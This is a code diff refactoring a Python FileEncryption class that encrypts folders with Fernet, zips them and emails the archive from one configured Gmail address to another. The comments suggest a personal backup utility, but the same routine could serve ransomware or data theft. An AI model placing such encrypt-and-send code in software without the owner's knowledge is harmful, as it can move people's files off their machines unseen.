@@ -8,14 +8,16 @@ import shutil
 from cryptography.fernet import Fernet
 
 # Custom modules
-import Util.DataClass as Data_Class
+from Util.DataClass import DataClass
 import Util.SendMail as SendMail
 
 
-class FileEncryption(Data_Class):
+class FileEncryption(DataClass):
     def __init__(self):
-        self.baseclass = Data_Class.DataClass.__init__(self)  # Call the base class __init__ method
-        self.SendMail = SendMail.SendMail
+        super().__init__()  # Call the base class __init__ method
+        self.baseclass = DataClass()  # Create an instance of the DataClass
+
+        self.mailer = SendMail.SendMail
 
         # Constants
         self.key_path = 'FileKey.key'
@@ -96,10 +98,9 @@ class FileEncryption(Data_Class):
                     zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))
 
         # Send the email with the ZIP file as an attachment
-        mailer = self.SendMail
-        mailer.sender_mail = self.gmail_address_sender  # Set your own Gmail address
-        mailer.receiver_mail = self.gmail_address_receiver  # Set your own Gmail address
-        mailer.send_mail(self, self.zip_file_path)
+        self.mailer.sender_mail = self.gmail_address_sender
+        self.mailer.receiver_mail = self.gmail_address_receiver
+        self.mailer.send_mail(self, self.zip_file_path)
 
         time.sleep(10)
 
